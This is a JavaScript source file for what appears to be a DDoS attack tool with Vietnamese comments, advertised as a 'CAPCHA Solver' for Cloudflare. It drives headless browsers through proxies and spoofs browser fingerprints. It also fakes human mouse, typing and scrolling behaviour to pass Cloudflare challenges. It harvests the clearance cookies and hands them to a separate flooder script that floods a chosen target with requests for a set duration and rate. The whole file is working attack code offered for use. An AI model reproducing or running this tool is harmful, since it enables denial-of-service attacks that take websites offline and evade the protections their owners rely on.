const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");
const {exec} = require('child_process');
const {spawn} = require("child_process");
const chalk = require('chalk');
const colors = require('colors');
const errorHandler = error => console.log(error);
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

Array.prototype.remove = function(item) {
    const index = this.indexOf(item);
    if (index !== -1) this.splice(index, 1);
    return item
};

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}
const validkey = generateRandomString(5, 10);

// User-Agents tốt nhất cho bypass Cloudflare
const userAgents = [
    // Chrome Windows - Phiên bản phổ biến
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    
    // Chrome macOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    
    // Firefox Windows
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    
    // Firefox macOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0',
    
    // Safari macOS
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    
    // Chrome Linux
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    
    // Edge Windows
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    
    // Mobile - iOS
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
    
    // Mobile - Android
    'Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    
    // Phiên bản cụ thể cho Cloudflare bypass
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    
    // Firefox ESR (Extended Support Release)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 ESR',
    
    // User-Agents độc đáo ít bị chặn
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Whale/3.23.214.10 Safari/537.36',
    
    // User-Agent với các phiên bản build
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.217 Safari/537.36'
];

function randomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

function getRandomUserAgent() {
    return randomElement(userAgents);
}

// Cookie encoding/decoding functions
function encodeCookie(cookieString) {
    try {
        return Buffer.from(cookieString).toString('base64');
    } catch (e) {
        return cookieString; // Fallback
    }
}

function decodeCookie(encodedCookie) {
    try {
        return Buffer.from(encodedCookie, 'base64').toString('utf8');
    } catch (e) {
        return encodedCookie; // Fallback
    }
}

// Log function với banner
function log(message, type = "info") {
    const d = new Date();
    const hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    const minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    const seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    const time = `${hours}:${minutes}:${seconds}`;
    
    let color;
    let prefix;
    
    switch(type) {
        case "success":
            color = colors.green;
            prefix = "CAPCHA";
            break;
        case "error":
            color = colors.red;
            prefix = "CAPCHA";
            break;
        case "warning":
            color = colors.yellow;
            prefix = "CAPCHA";
            break;
        case "flooder":
            color = colors.cyan;
            prefix = "FLOODER";
            break;
        default:
            color = colors.white;
            prefix = "CAPCHA";
    }
    
    console.log(`(${colors.magenta.bold(prefix)}/${colors.yellow.bold('BixD')}) | (${time}) | ${color(message)}`);
}

async function simulateHumanMouseMovement(page, element, options = {}) {
    const { minMoves = 5, maxMoves = 10, minDelay = 50, maxDelay = 150, jitterFactor = 0.1, overshootChance = 0.2, hesitationChance = 0.1, finalDelay = 500 } = options;
    const bbox = await element.boundingBox();
    if (!bbox) throw new Error('Element not visible');
    const targetX = bbox.x + bbox.width / 2;
    const targetY = bbox.y + bbox.height / 2;
    const pageDimensions = await page.evaluate(() => ({ width: window.innerWidth, height: window.innerHeight }));
    let currentX = Math.random() * pageDimensions.width;
    let currentY = Math.random() * pageDimensions.height;
    const moves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;
    for (let i = 0; i < moves; i++) {
        const progress = i / (moves - 1);
        let nextX = currentX + (targetX - currentX) * progress;
        let nextY = currentY + (targetY - currentY) * progress;
        nextX += (Math.random() * 2 - 1) * jitterFactor * bbox.width;
        nextY += (Math.random() * 2 - 1) * jitterFactor * bbox.height;
        if (Math.random() < overshootChance && i < moves - 1) {
            nextX += (Math.random() * 0.5 + 0.5) * (nextX - currentX);
            nextY += (Math.random() * 0.5 + 0.5) * (nextY - currentY);
        }
        await page.mouse.move(nextX, nextY, { steps: 10 });
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < hesitationChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 3));
        }
        currentX = nextX;
        currentY = nextY;
    }
    await page.mouse.move(targetX, targetY, { steps: 5 });
    await new Promise(resolve => setTimeout(resolve, finalDelay));
}

async function simulateHumanTyping(page, element, text, options = {}) {
    const { minDelay = 30, maxDelay = 100, mistakeChance = 0.05, pauseChance = 0.02 } = options;
    await simulateHumanMouseMovement(page, element);
    await element.click();
    await element.evaluate(el => el.value = '');
    for (let i = 0; i < text.length; i++) {
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < mistakeChance) {
            const randomChar = String.fromCharCode(97 + Math.floor(Math.random() * 26));
            await page.keyboard.press(randomChar);
            await new Promise(resolve => setTimeout(resolve, delay * 2));
            await page.keyboard.press('Backspace');
            await new Promise(resolve => setTimeout(resolve, delay));
        }
        await page.keyboard.press(text[i]);
        if (Math.random() < pauseChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 10));
        }
    }
}

async function simulateHumanScrolling(page, distance, options = {}) {
    const { minSteps = 5, maxSteps = 15, minDelay = 50, maxDelay = 200, direction = 'down', pauseChance = 0.2, jitterFactor = 0.1 } = options;
    const directionMultiplier = direction === 'up' ? -1 : 1;
    const steps = Math.floor(Math.random() * (maxSteps - minSteps + 1)) + minSteps;
    const baseStepSize = distance / steps;
    let totalScrolled = 0;
    for (let i = 0; i < steps; i++) {
        const jitter = baseStepSize * jitterFactor * (Math.random() * 2 - 1);
        let stepSize = Math.round(baseStepSize + jitter);
        if (i === steps - 1) {
            stepSize = (distance - totalScrolled) * directionMultiplier;
        } else {
            stepSize = stepSize * directionMultiplier;
        }
        await page.evaluate((scrollAmount) => {
            window.scrollBy(0, scrollAmount);
        }, stepSize);
        totalScrolled += stepSize * directionMultiplier;
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < pauseChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 6));
        }
    }
}

async function simulateNaturalPageBehavior(page) {
    const dimensions = await page.evaluate(() => {
        return { width: document.documentElement.clientWidth, height: document.documentElement.clientHeight, scrollHeight: document.documentElement.scrollHeight };
    });
    const scrollAmount = Math.floor(dimensions.scrollHeight * (0.2 + Math.random() * 0.6));
    await simulateHumanScrolling(page, scrollAmount, { minSteps: 8, maxSteps: 15, pauseChance: 0.3 });
    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 3000));
    const movementCount = 2 + Math.floor(Math.random() * 4);
    for (let i = 0; i < movementCount; i++) {
        const x = Math.floor(Math.random() * dimensions.width * 0.8) + dimensions.width * 0.1;
        const y = Math.floor(Math.random() * dimensions.height * 0.8) + dimensions.height * 0.1;
        await page.mouse.move(x, y, { steps: 10 + Math.floor(Math.random() * 20) });
        await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
    }
    if (Math.random() > 0.5) {
        await simulateHumanScrolling(page, scrollAmount / 2, { direction: 'up', minSteps: 3, maxSteps: 8 });
    }
}

async function spoofFingerprint(page, userAgent) {
    await page.evaluateOnNewDocument((ua) => {
        // Override screen properties
        Object.defineProperty(window, 'screen', {
            value: {
                width: 1920,
                height: 1080,
                availWidth: 1920,
                availHeight: 1080,
                colorDepth: 24,
                pixelDepth: 24,
                orientation: { type: 'landscape-primary', angle: 0 }
            }
        });

        // Override navigator properties
        Object.defineProperty(navigator, 'userAgent', { value: ua });
        Object.defineProperty(navigator, 'platform', { value: 'Win32' });
        Object.defineProperty(navigator, 'vendor', { value: 'Google Inc.' });
        Object.defineProperty(navigator, 'vendorSub', { value: '' });
        
        // Canvas fingerprint spoofing
        const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) return 'Intel Inc.'; // VENDOR
            if (parameter === 37446) return 'Intel Iris OpenGL Engine'; // RENDERER
            if (parameter === 3415) return 'AMD'; // UNMASKED_VENDOR_WEBGL
            if (parameter === 3416) return 'AMD Radeon Pro 560X OpenGL Engine'; // UNMASKED_RENDERER_WEBGL
            return getParameter.call(this, parameter);
        };

        // WebGL extensions spoofing
        const getSupportedExtensions = WebGLRenderingContext.prototype.getSupportedExtensions;
        WebGLRenderingContext.prototype.getSupportedExtensions = function() {
            const extensions = getSupportedExtensions.call(this);
            return extensions.filter(ext => !ext.includes('debug') && !ext.includes('profiler'));
        };

        // Plugins spoofing
        Object.defineProperty(navigator, 'plugins', {
            value: [
                { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format', length: 1 },
                { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', description: '', length: 0 },
                { name: 'Native Client', filename: 'internal-nacl-plugin', description: '', length: 0 }
            ],
            configurable: true
        });

        Object.defineProperty(navigator, 'mimeTypes', {
            value: [
                { type: 'application/pdf', suffixes: 'pdf', description: 'Portable Document Format', enabledPlugin: { name: 'Chrome PDF Plugin' } }
            ],
            configurable: true
        });

        Object.defineProperty(navigator, 'languages', { value: ['en-US', 'en'], configurable: true });
        Object.defineProperty(navigator, 'language', { value: 'en-US', configurable: true });
        Object.defineProperty(navigator, 'webdriver', { get: () => false, configurable: true });
        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 4, configurable: true });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8, configurable: true });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 0, configurable: true });
        Object.defineProperty(navigator, 'doNotTrack', { value: null, configurable: true });
        Object.defineProperty(navigator, 'onLine', { value: true, configurable: true });
        Object.defineProperty(navigator, 'connection', {
            value: {
                downlink: 10,
                effectiveType: '4g',
                rtt: 50,
                saveData: false,
                type: 'wifi'
            },
            configurable: true
        });

        // Timezone spoofing
        Object.defineProperty(Intl.DateTimeFormat.prototype, 'resolvedOptions', {
            value: function() {
                const result = Object.getOwnPropertyDescriptor(
                    Intl.DateTimeFormat.prototype, 
                    'resolvedOptions'
                ).value.call(this);
                result.timeZone = 'America/New_York';
                return result;
            },
            configurable: true
        });

        // Performance spoofing
        const originalPerformance = window.performance;
        Object.defineProperty(window, 'performance', {
            value: {
                ...originalPerformance,
                timing: {
                    navigationStart: originalPerformance.timing.navigationStart,
                    unloadEventStart: 0,
                    unloadEventEnd: 0,
                    redirectStart: 0,
                    redirectEnd: 0,
                    fetchStart: originalPerformance.timing.fetchStart,
                    domainLookupStart: originalPerformance.timing.domainLookupStart,
                    domainLookupEnd: originalPerformance.timing.domainLookupEnd,
                    connectStart: originalPerformance.timing.connectStart,
                    connectEnd: originalPerformance.timing.connectEnd,
                    secureConnectionStart: originalPerformance.timing.secureConnectionStart,
                    requestStart: originalPerformance.timing.requestStart,
                    responseStart: originalPerformance.timing.responseStart,
                    responseEnd: originalPerformance.timing.responseEnd,
                    domLoading: originalPerformance.timing.domLoading,
                    domInteractive: originalPerformance.timing.domInteractive,
                    domContentLoadedEventStart: originalPerformance.timing.domContentLoadedEventStart,
                    domContentLoadedEventEnd: originalPerformance.timing.domContentLoadedEventEnd,
                    domComplete: originalPerformance.timing.domComplete,
                    loadEventStart: originalPerformance.timing.loadEventStart,
                    loadEventEnd: originalPerformance.timing.loadEventEnd
                }
            },
            configurable: true
        });

        // LocalStorage spoofing
        Object.defineProperty(window, 'localStorage', {
            value: {
                getItem: function() { return null; },
                setItem: function() {},
                removeItem: function() {},
                clear: function() {},
                key: function() { return null; },
                length: 0
            },
            configurable: true
        });

        // SessionStorage spoofing
        Object.defineProperty(window, 'sessionStorage', {
            value: {
                getItem: function() { return null; },
                setItem: function() {},
                removeItem: function() {},
                clear: function() {},
                key: function() { return null; },
                length: 0
            },
            configurable: true
        });

        // Cookie spoofing
        Object.defineProperty(document, 'cookie', {
            configurable: true,
            enumerable: true,
            get: function() { return ''; },
            set: function() {}
        });

    }, userAgent);
}

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);

if (process.argv.length < 8) {
    console.clear();
    console.log(`
      ${colors.cyanBright('BROWSER V3')} | Updated: May 20, 2025
      ${colors.white.bold(`CAPCHA Solver`)} - Fast Bypass Captcha/UAM Cloudflare
      ${colors.green.bold(`Contact`)}: t.me/bixd08
      
      ${colors.blueBright('Usage:')}
        node ${process.argv[1]} <target> <duration> <threads browser> <threads flood> <rates> <proxy>
      
      ${colors.magenta.bold(`EXAMPLE`)}:
        node ${process.argv[1]} https://captcha.nminhniee.sbs 400 5 2 30 proxy.txt
        node ${process.argv[1]} https://www.target.com 300 10 5 50 proxy.txt
      
      ${colors.yellow.bold(`OPTIONS`)}:
        --debug true/false - Show detailed logs
        --mobile true/false - Use mobile mode
`);
    process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const thread = parseInt(process.argv[5]);
const rates = process.argv[6];
const proxyFile = process.argv[7];

// Parse additional options
let debug = false;
let mobileMode = false;

for (let i = 8; i < process.argv.length; i++) {
    if (process.argv[i] === '--debug') {
        debug = process.argv[i + 1] === 'true';
        i++;
    } else if (process.argv[i] === '--mobile') {
        mobileMode = process.argv[i + 1] === 'true';
        i++;
    }
}

const urlObj = new URL(targetURL);
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));

if (!/^https?:\/\//i.test(targetURL)) {
    log('URL must start with http:// or https://', "error");
    process.exit(1);
}

const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/).filter(proxy => {
            const regex = /^[\w\.-]+:\d+$/;
            return regex.test(proxy);
        });
        return proxies;
    } catch (error) {
        log(`Error reading proxy file: ${error.message}`, "error");
        return [];
    }
};

const proxies = readProxiesFromFile(proxyFile);
let cookieCount = 0;

async function solvingCaptcha(browser, page, browserProxy) {
    try {
        const title = await page.title();
        const content = await page.content();
        
        if (title === "Attention Required! | Cloudflare") {
            await browser.close();
            log("Blocked by Cloudflare. Exiting.", "error");
            return false;
        }
        
        if (content.includes("challenge-platform") || content.includes("cloudflare.challenges.com") || title === "Just a moment...") {
            log(`Cloudflare challenge detected with proxy: ${browserProxy}`, "warning");
            log(`Attempting to solve challenge...`, "info");
            
            await sleep(Math.floor(Math.random() * 8) + 4);
            
            const cookies = await page.cookies();
            const hasCfChlRcMCookie = cookies.some(cookie => cookie.name === "cf_chl_rc_m");
            
            if (hasCfChlRcMCookie) {
                log(`Waiting page load with proxy ${browserProxy}`, "info");
                await sleep(5);
            }

            const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
            if (captchaContainer) {
                await simulateHumanMouseMovement(page, captchaContainer, {
                    minMoves: 6, maxMoves: 15, minDelay: 30, maxDelay: 120, finalDelay: 700, jitterFactor: 18, overshootChance: 0.4, hesitationChance: 0.3
                });
                await captchaContainer.click();
                await captchaContainer.click({ offset: { x: 17, y: 20.5 } });
                await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
            }
        }
        
        await sleep(2);
        return true;
    } catch (error) {
        throw error;
    }
}

async function RetrySolving(browser, page, browserProxy) {
    try {
        const title = await page.title();
        const content = await page.content();
        
        if (title === "Attention Required! | Cloudflare") {
            await browser.close();
            log("Blocked by Cloudflare. Exiting.", "error");
            return false;
        }
        
        if (content.includes("challenge-platform") || content.includes("cloudflare.challenges.com") || title === "Just a moment...") {
            log(`Cloudflare challenge detected with proxy: ${browserProxy}`, "warning");
            log(`Attempting to solve challenge...`, "info");
            
            await sleep(17);
            
            const cookies = await page.cookies();
            const hasCfChlRcMCookie = cookies.some(cookie => cookie.name === "cf_chl_rc_m");
            
            if (hasCfChlRcMCookie) {
                log(`Waiting page load with proxy ${browserProxy}`, "info");
                await sleep(5);
            }

            const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
            if (captchaContainer) {
                await simulateHumanMouseMovement(page, captchaContainer, {
                    minMoves: 6, maxMoves: 15, minDelay: 30, maxDelay: 120, finalDelay: 700, jitterFactor: 18, overshootChance: 0.4, hesitationChance: 0.3
                });
                await captchaContainer.click();
                await captchaContainer.click({ offset: { x: 17, y: 20.5 } });
                await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
            }
        }
        
        await sleep(2);
        return true;
    } catch (error) {
        throw error;
    }
}

async function launchBrowserWithRetry(targetURL, browserProxy, attempt = 1, maxRetries = 2) {
    let browser;
    const userAgent = getRandomUserAgent();
    
    // Choose viewport based on mode
    const viewportConfig = mobileMode ? {
        width: 360,
        height: 640,
        deviceScaleFactor: 3,
        isMobile: true,
        hasTouch: true,
        isLandscape: false
    } : {
        width: 1920,
        height: 1080,
        deviceScaleFactor: 1,
        isMobile: false,
        hasTouch: false,
        isLandscape: false
    };
    
    const options = {
        headless: true,
        args: [
            `--proxy-server=${browserProxy}`,
            `--user-agent=${userAgent}`,
            '--headless=new',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--no-zygote',
            `--window-size=${viewportConfig.width},${viewportConfig.height}`,
            '--disable-gpu',
            '--disable-accelerated-2d-canvas',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-back-forward-cache',
            '--disable-browser-side-navigation',
            '--disable-renderer-backgrounding',
            '--disable-ipc-flooding-protection',
            '--metrics-recording-only',
            '--disable-extensions',
            '--disable-default-apps',
            '--disable-application-cache',
            '--disable-component-extensions-with-background-pages',
            '--disable-client-side-phishing-detection',
            '--disable-popup-blocking',
            '--disable-prompt-on-repost',
            '--disable-breakpad',
            '--disable-field-trial-config',
            '--disable-background-networking',
            '--disable-search-engine-choice-screen',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--tls-min-version=1.2',
            '--tls-max-version=1.3',
            '--ssl-version-min=tls1.2',
            '--ssl-version-max=tls1.3',
            '--enable-quic',
            '--enable-features=PostQuantumKyber',
            '--disable-blink-features=AutomationControlled',
            '--no-first-run',
            '--test-type',
            '--allow-pre-commit-input',
            '--force-color-profile=srgb',
            '--use-mock-keychain',
            '--enable-features=NetworkService,NetworkServiceInProcess',
            '--disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,DestroyProfileOnBrowserClose,MediaRouter,DialMediaRouteProvider,AcceptCHFrame,AutoExpandDetailsElement,CertificateTransparencyComponentUpdater,AvoidUnnecessaryBeforeUnloadCheckSync,Translate,HttpsUpgrades,PaintHolding,SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure,IsolateOrigins,site-per-process'
        ],
        defaultViewport: viewportConfig
    };

    try {
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();
        const client = page._client();
        
        await spoofFingerprint(page, userAgent);

        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
                client.send("Target.detachFromTarget", { targetId: frame._id }).catch(() => {});
            }
        });

        page.setDefaultNavigationTimeout(60 * 1000);
        await page.goto(targetURL, { waitUntil: "domcontentloaded" });
        await simulateNaturalPageBehavior(page);

        let captchaAttempts = 0;
        const maxCaptchaAttempts = 4;

        while (captchaAttempts < maxCaptchaAttempts) {
            await RetrySolving(browser, page, browserProxy);
            const cookies = await page.cookies(targetURL);
            const shortCookies = cookies.filter(cookie => cookie.value.length < 15);

            if (shortCookies.length === 0) {
                const title = await page.title();
                const cookieString = cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim();
                await browser.close();
                
                return {
                    title: title,
                    browserProxy: browserProxy,
                    cookies: cookieString,
                    userAgent: userAgent
                };
            }
            
            if (debug) {
                shortCookies.forEach(cookie => {
                    log(`Error solve with cookies "${cookie.name}"`, "warning");
                });
            }
            
            captchaAttempts++;
            log(`Retry ${captchaAttempts} solving with proxy: ${browserProxy}`, "warning");
        }
        
        log(`Failed to solve captcha with proxy: ${browserProxy}`, "error");
        await browser.close();
        return null;
        
    } catch (error) {
        if (browser) {
            await browser.close().catch(() => {});
        }
        throw error;
    }
}

async function startthread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries === 1) {
        const currentTask = queue.length();
        done(null, { task, currentTask });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        
        if (response) {
            if (response.title === "Attention Required! | Cloudflare") {
                log("Blocked by Cloudflare. Exiting.", "error");
                return;
            }
            
            if (!response.cookies || response.cookies.length < 10) {
                log(`No valid cookies with proxy: ${browserProxy}`, "warning");
                await startthread(targetURL, browserProxy, task, done, retries + 1);
                return;
            }
            
            cookieCount++;
            
            // Display result với format đẹp
            console.log(`\n${colors.cyan('='.repeat(60))}`);
            console.log(`${colors.white.bold('CAPCHA Result')}:`);
            console.log(`${colors.cyan('-'.repeat(40))}`);
            console.log(`   ${chalk.black.bold.bgWhite('Total_Cookies')}: ${colors.green(cookieCount)}`);
            console.log(`   ${chalk.black.bold.bgWhite('pageTitle')}: ${colors.green(response.title)}`);
            console.log(`   ${chalk.black.bold.bgWhite('proxyAddress')}: ${colors.green(browserProxy)}`);
            console.log(`   ${chalk.black.bold.bgWhite('userAgent')}: ${colors.green(response.userAgent.substring(0, 50) + '...')}`);
            console.log(`   ${chalk.black.bold.bgWhite('cookieFound')}: ${colors.green(response.cookies.substring(0, 80) + '...')}`);
            console.log(`${colors.cyan('='.repeat(60))}\n`);
            
            // Save cookies to file
            fs.appendFileSync('cookies.txt', `${browserProxy} | ${response.userAgent} | ${response.cookies}\n`, 'utf8');
            
            try {
                // Encode cookie thành base64 trước khi truyền
                const encodedCookie = encodeCookie(response.cookies);
                const floodThreads = parseInt(thread) || 2;
                const floodRate = parseInt(rates) || 30;
                
                // Start bypass.js với các tham số đầy đủ
                const bypassProcess = spawn("node", [
                    "2.js",
                    "GET",
                    targetURL,
                    duration.toString(),
                    floodThreads.toString(),
                    floodRate.toString(),
                    response.browserProxy,
                    encodedCookie,
                    response.userAgent,
                    debug ? "--debug" : ""
                ], {
                    stdio: ['pipe', 'pipe', 'pipe'],
                    detached: true
                });
                
                log(`Started flooder with proxy: ${browserProxy}`, "success");
                
                // Log output từ bypass.js
                if (debug) {
                    bypassProcess.stdout.on('data', (data) => {
                        const output = data.toString().trim();
                        if (output) {
                            log(`[BYPASS] ${output}`, "flooder");
                        }
                    });
                    
                    bypassProcess.stderr.on('data', (data) => {
                        const error = data.toString().trim();
                        if (error) {
                            log(`[BYPASS ERROR] ${error}`, "error");
                        }
                    });
                }
                
            } catch (error) {
                log(`Error spawning bypass.js: ${error.message}`, "error");
            }
            
            done(null, { task });
        } else {
            await startthread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        log(`Thread error: ${error.message}`, "error");
        await startthread(targetURL, browserProxy, task, done, retries + 1);
    }
}

const queue = async.queue(function(task, done) {
    startthread(targetURL, task.browserProxy, task, done)
}, threads);

queue.drain(function() {
    log("All proxies processed", "success");
    process.exit(1);
});

// Cleanup function
function cleanup() {
    log("Time's up! Cleaning up...", "warning");
    
    queue.kill();
    
    exec('pkill -f bypass', (err) => {
        if (err && err.code !== 1) {
            log(`Error killing bypass processes: ${err.message}`, "warning");
        } else {
            log("Successfully killed bypass.js processes", "success");
        }
    });
    
    exec('pkill -f chrome', (err) => {
        if (err && err.code !== 1) {
            log(`Error killing Chrome processes: ${err.message}`, "warning");
        } else {
            log("Successfully killed Chrome processes", "success");
        }
    });
    
    exec('pkill -f chromium', (err) => {
        if (err && err.code !== 1 && debug) {
            // Ignore if no processes found
        }
    });
    
    setTimeout(() => {
        log("Exiting", "success");
        process.exit(0);
    }, 5000);
}

async function main() {
    if (proxies.length === 0) {
        log("No proxies found in file. Exiting.", "error");
        process.exit(1);
    }
    
    console.clear();
    log(`CAPCHA Solver - Cloudflare Bypass Tool`, "success");
    log(`Target: ${targetURL}`, "info");
    log(`Duration: ${duration} seconds`, "info");
    log(`Threads Browser: ${threads}`, "info");
    log(`Threads Flooder: ${thread}`, "info");
    log(`Rates Flooder: ${rates}`, "info");
    log(`Proxies: ${proxies.length} | Filename: ${proxyFile}`, "info");
    log(`Mode: ${mobileMode ? 'Mobile' : 'Desktop'}`, "info");
    console.log();
    
    for (let i = 0; i < proxies.length; i++) {
        const browserProxy = proxies[i];
        queue.push({browserProxy: browserProxy});
    }
    
    // Set cleanup timer
    setTimeout(() => {
        cleanup();
    }, duration * 1000);
    
    // Progress monitor
    const progressInterval = setInterval(() => {
        const processed = proxies.length - queue.length();
        const percentage = Math.round((processed / proxies.length) * 100);
        
        if (processed > 0) {
            log(`Progress: ${processed}/${proxies.length} proxies (${percentage}%) - ${cookieCount} cookies found`, "info");
        }
    }, 10000);
    
    // Clear interval on exit
    process.on('exit', () => {
        clearInterval(progressInterval);
    });
}

// Start the script
log("Running CAPCHA Solver...", "success");
main().catch(err => {
    log(`Main function error: ${err.message}`, "error");
    process.exit(1);
});